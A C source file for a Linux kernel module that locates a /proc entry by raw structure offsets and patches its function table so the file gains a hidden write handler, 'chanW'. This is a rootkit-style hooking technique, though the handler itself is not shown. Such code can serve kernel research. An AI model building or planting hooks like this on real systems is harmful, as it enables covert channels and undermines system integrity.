#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/stddef.h>
#include <linux/err.h>

#include "phfs.h"

static struct target tgt;
static char  *target = PHFS_TARGET;
module_param(target, charp, 0400);

static int selfcheck (void)
{
	pr_info("delta_pde=%ld off_ops=%zu proc_write=%zu ops=%zu\n",
		delta_pde, off_ops,
		offsetof(struct proc_ops, proc_write), sizeof(struct proc_ops));

	if (delta_pde != -48 || off_ops != 48)
		pr_warn(";) Change offsets\n"); /*  */
	if (offsetof(struct proc_ops, proc_write) != 32 ||
	    sizeof(struct proc_ops) != 96)
		pr_warn("unexpected proc_ops layout [check with pahole!]\n");
	return 0;
}

int attach (struct target *t, const char *path,
	          bool seq_expected)
{
	struct proc_dir_entry *pde;
	const struct proc_ops *orig;
	void **slot;
	int ret;

	ret = resolve(path, &pde, &orig, seq_expected);
	if (ret)
		return ret;

	t->copy = kmemdup(orig, sizeof(*t->copy), GFP_KERNEL);
	if (!t->copy)
		return -ENOMEM;

	if (t->copy->proc_write) {
		kfree(t->copy);
		t->copy = NULL;
		return -EEXIST;
	}

	t->copy->proc_write = chanW;

	slot    = (void **)((char *)pde + off_ops);
	t->pde  = pde;
	t->orig = orig;
	t->slot = slot;
	*slot   = t->copy;
	return 0;
}

void detach (struct target *t)
{
	if (!t->pde || !t->copy)
		return;

	cmpxchg(t->slot, t->copy, (void *)t->orig);
	synchronize_rcu();
	kfree(t->copy);
	t->copy = NULL;
	t->pde  = NULL;
	t->slot = NULL;
	t->orig = NULL;
}

static int __init phfs_init (void)
{
	int ret;

	ret = probe_offsets();
	if (ret) {
		pr_err("offset probe failed (%d)\n", ret);
		return ret;
	}
	selfcheck();

	ret = attach(&tgt, target, SEQ_EXPECTED);
	if (ret) {
		pr_err("attach in %s failed (%d)\n", target, ret);
		return ret;
	}

	pr_info("C: %s | delta_pde=%ld off_ops=%zu\n",
		target, delta_pde, off_ops);
	return 0;
}

static void __exit phfs_exit(void)
{
	detach(&tgt);
}

module_init(phfs_init);
module_exit(phfs_exit);
MODULE_LICENSE("GPL");
